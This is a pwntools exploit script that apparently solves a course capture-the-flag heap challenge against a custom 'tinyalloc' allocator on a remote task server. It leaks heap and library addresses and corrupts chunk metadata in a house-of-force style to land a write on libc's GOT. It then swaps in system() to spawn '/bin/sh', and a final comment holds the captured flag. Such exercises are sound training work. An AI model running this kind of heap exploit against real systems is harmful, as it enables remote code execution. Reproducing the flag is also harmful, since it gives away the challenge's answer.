from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b *read_index+55
#b char_buffer_add_slow
#command
#heap
#end
#b allocate_chunk
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 32915)

#p=remote("127.0.0.1", 1026)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/tinyalloc") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
#sleep(4)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


def allocate(index, size, content):
    # note_size is 256
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Which index do you want to allocate? ", f"{index}".encode())
    p.sendlineafter(b"How large do you want the entry to be? ", f"{size}".encode())
    p.sendafter(b"Enter the contents: ", content)


def show(index, returning=True):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Which index do you want to show? ", f"{index}".encode())
    if returning:
        content = p.recvline()
        return content


def deallocate(index):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Which index do you want to deallocate? ", f"{index}".encode())


def leave(index, note):
    p.sendlineafter(b"> ", b"4")


p.recvuntil(b"To test whether the allocator is actually working: malloc is at ")

libtinyalloc_leak = int(p.recvline(), 16)

# guessing offsets is pain ...
libc_addr = libtinyalloc_leak-0x1e91c1+(0x1000*3)

print("libc: ", hex(libc_addr))

allocate(0, 0x1F, b"A"*0x20)
allocate(1, 0x1F, b"B"*0x20)
deallocate(0)
allocate(0, 0x20, b"C"*0x21)


heap_leak = int((show(0)[0x21:-1][::-1]+b"\0").hex(), 16)
print("heap: ", hex(heap_leak))

allocate(2, 0x1000, b"D"*0x1001)


libc = ELF("./libc.so.6")
libc.address = libc_addr


# - next:  0x55e55a951000 (0x1e4f0 bytes)
# - flags: (MCF_PREVINUSE | MCF_TOP | MCF_FREELIST)
# - fd:    0x7f7e3f6d7040 (arena)
# - bk:    0x55e55a932070

libc_got = libc_addr + 0x1d2080

flags = 0x2c00000000000000
next_ = libc_got+0x200#-(heap_leak+0x10b0)
arena = libtinyalloc_leak+0x2e7f#libc_addr+0x1ec040
#             next and flags |     fd     |     bk
payload = p64(flags | next_) + p64(arena) + p64(arena)+p64(libc.symbols['system']) #unnecessary system leftover

allocate(4, 0x20, b"E"*0x21)
allocate(3, 0x200, p64(0)+payload+b"\n")

deallocate(2)

allocate(2, 0x1008, b"A"*0x1008+b"\xb0")

allocate(5, 0x10, b"."*0xF+b"\n")

deallocate(4)
deallocate(3)


#input("magic1")

# house of force: after making size of top chunk large
# enough to get from heap into libc got, allocate large
# chunk but don't use it, to prevent segfault
# afterwards allocate again, but get a pointer on the
# libc got
allocate(20, libc_got-(heap_leak+0x1070)-0x30, b"."*0xF+b"\n")
allocate(201, 0x200, b"Z"*0xF+b"\n")


# overwrite got with /bin/sh and system address, than print
# this entry which is on the got with puts which calls
# overwritten strlen (system)
allocate(30, 0x20, b"/bin/sh\0"+b"A"*0x8+p64(libc.symbols["system"])+b"\n")

show(30, returning=False)


p.interactive()

#softsec{jtgvqG_k0lbAotXguOte8LWRhtFA8B7Jk8AQT4i3gYLcr9FRgWbL9bg_t8-9nfs1}